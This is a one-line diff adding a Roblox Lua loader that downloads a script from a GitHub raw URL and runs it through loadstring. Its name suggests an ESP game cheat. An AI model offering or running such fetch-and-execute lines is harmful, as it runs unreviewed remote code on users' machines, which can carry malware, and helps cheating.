@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ItoshiTeruz/scripts/main/SmallEspText", true))()
